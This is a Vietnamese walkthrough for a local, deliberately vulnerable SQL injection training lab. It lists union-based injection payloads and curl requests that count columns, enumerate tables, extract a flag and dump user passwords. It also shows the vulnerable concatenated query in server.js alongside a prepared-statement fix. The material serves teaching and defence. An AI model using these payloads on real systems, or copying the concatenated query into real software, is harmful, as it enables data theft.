# 🎯 Hướng Dẫn Demo SQL Injection Lab

## 🚀 Khởi động dự án

```bash
npm install
npm start
```

Server sẽ chạy tại: `http://localhost:3000`

## 📝 Các bước thực hành

### Bước 1: Truy cập trang chủ

-   Mở trình duyệt: `http://localhost:3000`
-   Bạn sẽ thấy danh sách các lab
-   Click vào **"SQL Injection"** để bắt đầu

### Bước 2: Xem danh sách posts

-   Khi vào trang lab, bạn sẽ thấy **tất cả title** từ bảng posts hiển thị ngay
-   Có 5 bài viết được hiển thị sẵn

### Bước 3: Tìm kiếm bình thường

Thử tìm kiếm với từ khóa thông thường:

```
SQL
```

Kết quả: Hiển thị bài viết "SQL Injection là gì?"

### Bước 4: Phát hiện lỗ hổng

Thử nhập ký tự đặc biệt:

```
'
```

Sẽ thấy lỗi SQL → Xác nhận có lỗ hổng SQL Injection

### Bước 5: Xác định số cột

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

→ Lỗi ở ORDER BY 3 → Có 2 cột

### Bước 6: Union-based SQL Injection

Test với Union:

```
' UNION SELECT 1,2--
```

### Bước 7: Khám phá các bảng

Lấy danh sách bảng trong database:

```
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--
```

Kết quả sẽ hiển thị:

-   posts
-   users
-   secret

### Bước 8: Xem cấu trúc bảng secret

```
' UNION SELECT 1, sql FROM sqlite_master WHERE name='secret'--
```

### Bước 9: Lấy FLAG 🚩

```
' UNION SELECT id, flag FROM secret--
```

**Kết quả:** `FLAG{SQL_1nj3ct10n_M4st3r}`

### Bước 10: Lấy thông tin users

```
' UNION SELECT id, username FROM users--
' UNION SELECT id, password FROM users--
' UNION SELECT username, password FROM users--
```

## 🧪 Test bằng cURL

### Tìm kiếm bình thường:

```bash
curl "http://localhost:3000/api/search?q=SQL"
```

### Lấy flag:

```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20id,%20flag%20FROM%20secret--"
```

### Lấy users:

```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20username,%20password%20FROM%20users--"
```

## 🔍 Giải thích kỹ thuật

### Tại sao có lỗ hổng?

Code trong `server.js`:

```javascript
const query = `SELECT id, title FROM posts WHERE title LIKE '%${searchTerm}%'`;
```

❌ **Vấn đề**: Nối chuỗi trực tiếp input của user vào SQL query

### Cách khai thác:

1. **Input**: `' UNION SELECT id, flag FROM secret--`
2. **Query thực tế**:

```sql
SELECT id, title FROM posts WHERE title LIKE '%' UNION SELECT id, flag FROM secret--%'
```

3. **Giải thích**:
    - `%'` → Kết thúc điều kiện LIKE
    - `UNION SELECT id, flag FROM secret` → Lấy dữ liệu từ bảng secret
    - `--` → Comment phần còn lại của query (`%'`)

### Cách phòng chống:

✅ **Sử dụng Prepared Statements**:

```javascript
const query = `SELECT id, title FROM posts WHERE title LIKE ?`;
db.all(query, [`%${searchTerm}%`], callback);
```

## 🎓 Bài tập nâng cao

1. **Thử lấy email của users**
2. **Đếm số lượng bảng trong database**
3. **Lấy tất cả tên cột của bảng secret**
4. **Kết hợp nhiều thông tin từ nhiều bảng**

## 📊 Cấu trúc Database

### Bảng posts:

| id  | title            | content             |
| --- | ---------------- | ------------------- |
| 1   | Chào mừng...     | Đây là bài viết...  |
| 2   | SQL Injection... | SQL Injection là... |

### Bảng users:

| id  | username | password | email           |
| --- | -------- | -------- | --------------- |
| 1   | admin    | admin123 | admin@lab.local |

### Bảng secret:

| id  | flag                       | description         |
| --- | -------------------------- | ------------------- |
| 1   | FLAG{SQL_1nj3ct10n_M4st3r} | Bí mật của hệ thống |

## ⚠️ Lưu ý quan trọng

-   Đây là môi trường thực hành **CÓ LỖ HỔNG CỐ TÌNH**
-   **KHÔNG BAO GIỜ** viết code như vậy trong production
-   Luôn validate và sanitize user input
-   Sử dụng Prepared Statements/Parameterized Queries
-   Implement proper error handling

---

Happy Hacking! 🎉 (Trong môi trường lab an toàn)
